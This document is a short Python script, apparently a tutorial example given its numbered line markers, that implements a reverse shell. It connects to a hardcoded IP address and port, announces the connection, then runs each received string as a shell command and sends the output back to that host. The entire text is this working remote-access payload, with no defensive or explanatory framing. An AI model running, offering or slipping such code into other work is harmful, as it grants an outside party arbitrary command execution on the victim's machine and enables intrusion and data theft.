import socket,subprocess

HOST = '169.254.69.62'                                            #(1)
PORT = 11443                                              
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send('[*] Connection Established!')

while 1:
     data = s.recv(1024)                                          #(2)
     if data == "quit": break
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)                                               #(3)
     stdout_value = proc.stdout.read() + proc.stderr.read()       #(4)
     s.send(stdout_value)                                         #(5)
s.close()
